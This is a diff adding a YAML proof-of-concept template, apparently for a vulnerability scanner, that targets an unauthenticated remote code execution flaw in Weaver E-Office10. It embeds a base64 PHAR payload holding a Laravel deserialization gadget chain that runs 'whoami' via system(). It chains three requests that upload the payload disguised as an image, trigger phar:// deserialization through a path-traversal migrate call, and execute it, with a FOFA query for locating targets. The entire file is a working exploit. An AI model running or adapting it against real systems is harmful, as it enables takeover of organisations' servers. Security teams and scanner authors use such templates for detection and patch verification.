@@ -1,0 +1,51 @@
+id: poc-yaml-weaver-e-office10-atuh-file-rce
+info:
+  name: 泛微E-Office10 atuh-file 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: e-office10
+  fofa: body="/eoffice10"
+variables:
+  t1: str("PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQp9AQAAAQAAABEAAAABAAAAAABHAQAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjU6e3M6MTI6IgAqAGNvbnRhaW5lciI7TjtzOjExOiIAKgBwaXBlbGluZSI7TjtzOjg6IgAqAHBpcGVzIjthOjA6e31zOjExOiIAKgBoYW5kbGVycyI7YTowOnt9czoxNjoiACoAcXVldWVSZXNvbHZlciI7czo2OiJzeXN0ZW0iO31zOjg6IgAqAGV2ZW50IjtPOjM4OiJJbGx1bWluYXRlXEJyb2FkY2FzdGluZ1xCcm9hZGNhc3RFdmVudCI6MTp7czoxMDoiY29ubmVjdGlvbiI7czo2OiJ3aG9hbWkiO319CAAAAHRlc3QudHh0BAAAACpdBmYEAAAADH5/2KQBAAAAAAAAdGVzdO4PPAt4/NUWNWXWAzOoVlseOkFwAgAAAEdCTUI=")
+  payload: base64_decode(t1)
+requests:
+- method: POST
+  path: /eoffice10/server/public/api/attachment/atuh-file
+  headers:
+    Content-Type: multipart/form-data; boundary=49de7302166055796bdcdc50ba105ddd
+  data: '--49de7302166055796bdcdc50ba105ddd
+
+    Content-Disposition: form-data; name="Filedata"; filename="register.inc"
+
+    Content-Type: image/jpeg
+
+
+    {{.payload}}
+
+    --49de7302166055796bdcdc50ba105ddd--'
+  expression: 'status_code == 200 &&
+
+    contains(body,"attachment_id") &&
+
+    contains(body,"attachment_name") &&
+
+    contains(content_type,"application/json")
+
+    '
+  output:
+  - regex_match(body,`"attachment_id":"(?P<attachment_id>.*?)",`)
+- method: POST
+  path: /eoffice10/server/public/api/attachment/path/migrate
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F
+  expression: status_code == 200 && contains(body,"\"status\":1")
+- method: POST
+  path: /eoffice10/server/public/api/empower/import
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: type=tttt&file={{.attachment_id}}
+  expression: status_code == 200 && contains(body,"\"code\":\"no_file\"") && contains(content_type,"application/json")
+    && contains(body,"system")
+transport: http
